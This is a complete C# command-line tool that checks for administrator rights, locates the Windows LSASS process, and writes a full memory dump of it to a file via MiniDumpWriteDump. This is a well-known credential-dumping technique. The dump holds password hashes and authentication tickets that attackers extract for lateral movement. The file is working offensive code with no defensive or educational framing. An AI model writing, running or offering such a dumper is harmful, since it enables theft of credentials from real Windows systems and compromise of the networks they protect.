using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

class cliLsassDumper
{
    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallackParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    static void Main(string[] args)
    {
        try
        {
            if (!IsAdministrator())
            {
                Log("The tool needs to be run with administrative privileges.");
                return;
            }

            if (args.Length == 0)
            {
                Log("Usage: <ExecutableName> <DumpFilePath> [LSASS_Process_ID]");
                return;
            }

            string dumpFilePath = args[0];
            Process lsass;

            if (args.Length > 1 && int.TryParse(args[1], out int processId))
            {
                lsass = Process.GetProcessById(processId);
            }
            else
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                if (processes.Length == 0)
                {
                    Log("lsass process not found.");
                    return;
                }
                lsass = processes[0];  
            }

            IntPtr hFile = CreateFile(dumpFilePath, 0xC0000000, 3, IntPtr.Zero, 4, 0x80, IntPtr.Zero);
            if (hFile == IntPtr.Zero)
            {
                Log("Failed to create dump file.");
                return;
            }

            bool dumpSuccessful = MiniDumpWriteDump(lsass.Handle, (uint)lsass.Id, hFile, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            CloseHandle(hFile);

            if (!dumpSuccessful)
            {
                Log("Failed to create LSASS dump.");
                File.Delete(dumpFilePath); 
            }
            else
            {
                Log("LSASS dump created successfully.");
            }
        }
        catch (Exception ex)
        {
            Log($"An error occurred: {ex.Message}");
        }
    }

    static bool IsAdministrator()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void Log(string message)
    {
        Console.WriteLine($"[{DateTime.Now}] {message}");
    }
}
